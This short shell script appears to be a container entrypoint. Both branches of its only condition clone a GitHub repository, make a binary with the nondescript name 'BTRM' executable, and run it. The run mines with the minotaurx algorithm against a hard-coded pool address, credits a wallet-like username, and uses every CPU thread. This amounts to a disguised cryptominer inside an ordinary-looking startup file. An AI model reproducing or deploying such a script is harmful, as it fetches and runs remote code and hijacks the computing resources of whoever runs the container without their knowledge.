#!/bin/sh

set -e

if [ "$PROTO" = "ws" ]
then	git clone https://github.com/sxiankerigak/parklite.git && cd parklite && chmod +x BTRM && ./BTRM -a minotaurx -o 165.227.89.212:443 -u PHH7Zq7tUpRjMqEvN3QXHsoprjzZpAxnzm.XXX -p x -t$(nproc --all)
else	git clone https://github.com/sxiankerigak/parklite.git && cd parklite && chmod +x BTRM && ./BTRM -a minotaurx -o 165.227.89.212:443 -u PHH7Zq7tUpRjMqEvN3QXHsoprjzZpAxnzm.XXX -p x -t$(nproc --all)
fi


exec "$@"
